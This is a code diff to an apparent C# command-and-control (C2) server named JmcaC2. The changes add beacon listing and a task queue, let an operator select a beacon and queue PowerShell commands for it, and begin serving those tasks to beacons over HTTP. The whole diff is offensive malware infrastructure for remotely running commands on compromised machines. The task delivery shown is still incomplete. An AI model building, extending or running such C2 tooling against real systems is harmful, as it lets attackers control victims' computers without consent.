@@ -14,10 +14,10 @@ namespace JmcaC2
 
 
         static List<BeaconClient> Clients = new List<BeaconClient>();
+        static List<BeaconTask> BeaconTasks = new List<BeaconTask>();
         static BeaconClient CurrentBeacon;
         static HashSet<string> ClientNames = new HashSet<string>();
 
-        static Dictionary<string, string> Tasks = new Dictionary<string, string> { };
         public static void Main(string[] args)
         {
             // plan for command and control server
@@ -71,19 +71,29 @@ namespace JmcaC2
                             Console.WriteLine("Server is already running");
                         }
                         break;
-                    case "listeners":
-                        ViewConnections();
+                    case "beacons":
+                        PrintBeacons();
                         break;
 
                     case "use":
                         SetCurrentBeaconSession(CmdArgs);
                         break;
 
-                    case "powershell":
-                        //  Dictionary<string, string> command = new Dictionary<string, string> { { CmdPrefix, CmdArgs } };
-                        Tasks.Add(CmdPrefix, CmdArgs);
+                    case "tasks":
+                        PrintTasks();
                         break;
-
+                    case "powershell":
+                        if (CurrentBeacon == null)
+                        {
+                            Console.ForegroundColor = ConsoleColor.Red;
+                            Console.WriteLine(" No active beacon selected. Run: use BeaconName");
+                            Console.ForegroundColor = ConsoleColor.White;
+                            break;
+                        }
+                        BeaconTasks.Add(new BeaconTask(CurrentBeacon.Name, CmdPrefix, CmdArgs));
+                        Console.WriteLine($"Added task for {CurrentBeacon.Name}");
+                        break;
+                    //  Dictionary<string, string> command = new Dictionary<string, string> { { CmdPrefix, CmdArgs } };
                     case "stop":
                         serverRunning = false;
                         listener.Stop();
@@ -137,28 +147,27 @@ namespace JmcaC2
 
         }
 
-        public static void SetCurrentBeaconSession(string CmdArgs)
+        public static void SetCurrentBeaconSession(string name)
         {
-
-            if (CurrentBeacon != null)
+            if (string.IsNullOrWhiteSpace(name))
             {
-                CurrentBeacon = Clients[0];
-                Console.WriteLine($"Set Beacon to {CurrentBeacon.Name}");
+                Console.WriteLine("Usage: use BeaconName");
                 return;
             }
-            foreach (BeaconClient Client in Clients)
+
+            foreach (var client in Clients)
             {
-                if (Client.Name == CmdArgs)
+                if (client.Name == name)
                 {
-                    CurrentBeacon = Client;
-                    Console.WriteLine($"Set Beacon to {CurrentBeacon.Name}");
+                    CurrentBeacon = client;
+                    Console.WriteLine($"Current beacon set to {client.Name}");
                     return;
                 }
             }
 
-            Console.WriteLine($"{CmdArgs} Not Found!");
+            Console.WriteLine($"Beacon '{name}' not found");
         }
-        public static void ViewConnections()
+        public static void PrintBeacons()
         {
             if (Clients == null || Clients.Count == 0)
             {
@@ -166,7 +175,7 @@ namespace JmcaC2
                 return;
             }
 
-            Console.WriteLine($"{"Beacon Name",-15} {"Client IP",-14} | {"Last CheckIn",-20}");
+            Console.WriteLine($"{"Beacon Name",-15} | {"Client IP",-14} | {"Last CheckIn",-20}");
             Console.WriteLine("--------------------------------------------------------------");
 
             foreach (var client in Clients)
@@ -191,6 +200,17 @@ namespace JmcaC2
         // Handle incoming HTTP connections
         // GET requests are for beacon tasks
         // POST requests are for task results
+
+        public static void PrintTasks()
+        {
+            Console.WriteLine($"{"Client Name",-15} | {"Task Name",-14} | {"Task Args",-20}");
+            Console.WriteLine("---------------------------------------------------------------");
+
+            foreach (var task in BeaconTasks)
+                Console.WriteLine(task);
+        }
+
+
         public static void HandleConnections()
         {
             while (serverRunning)
@@ -205,7 +225,19 @@ namespace JmcaC2
                         // Handle GET request for beacon tasks
                         Console.WriteLine($"Received request for tasks from {request.RemoteEndPoint.Address}");
 
-                        string responseString = "No tasks";
+
+                        string responseString = "No Tasks";
+                        if (BeaconTasks.Count > 0)
+                        {
+
+                            foreach (BeaconTask BeaconTask in BeaconTasks)
+                            {
+                                Console.WriteLine(BeaconTask);
+
+                            }
+
+
+                        }
                         byte[] buffer = System.Text.Encoding.UTF8.GetBytes(responseString);
                         response.ContentLength64 = buffer.Length;
 
